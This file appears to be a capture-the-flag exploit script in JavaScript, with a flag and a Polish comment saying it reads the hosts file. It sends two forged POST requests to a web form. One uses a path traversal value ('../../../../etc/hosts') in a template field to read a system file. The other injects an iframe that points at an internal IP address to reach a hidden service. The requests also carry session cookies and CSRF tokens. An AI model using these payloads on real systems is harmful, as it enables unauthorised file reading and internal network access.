// FLAG{71a4b4fd2214b808e4942dfb06c717878399a04c}
//skrypt do odczytania pliku hosts
var content ='ToJestTekst';
var template = '../../../../../../../etc/hosts';
fetch("https://web.kazet.cc:42448/create", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "sec-ch-ua": "\"Google Chrome\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "cookie": "csrftoken=zC34koY9GrvqExROsqkMxqqcze7CPNdA; sessionid=xpbsxf5ss7iq1q7bfv7hz87cpo2fujfs",
    "Referer": "https://web.kazet.cc:42448/create",
    "Referrer-Policy": "same-origin"
  },
  "body": `csrfmiddlewaretoken=nx9tOIhzlvPDyV2EndoRUiZDcLjNc9ssMZ2nYW5yRMaT2iJiFtythyfFBPgfRMvS&recipient=zuzanka&content=${content}&template=${template}`,
  "method": "POST"
});


var htmlCode = '<iframe src="http://172.20.0.3" width = 500>';
fetch("https://web.kazet.cc:42448/create", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "sec-ch-ua": "\"Google Chrome\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "cookie": "csrftoken=zC34koY9GrvqExROsqkMxqqcze7CPNdA; sessionid=xpbsxf5ss7iq1q7bfv7hz87cpo2fujfs",
    "Referer": "https://web.kazet.cc:42448/create",
    "Referrer-Policy": "same-origin"
  },
  "body": `csrfmiddlewaretoken=nx9tOIhzlvPDyV2EndoRUiZDcLjNc9ssMZ2nYW5yRMaT2iJiFtythyfFBPgfRMvS&recipient=zuzanka&content=${htmlCode}&template=normal`,
  "method": "POST"
});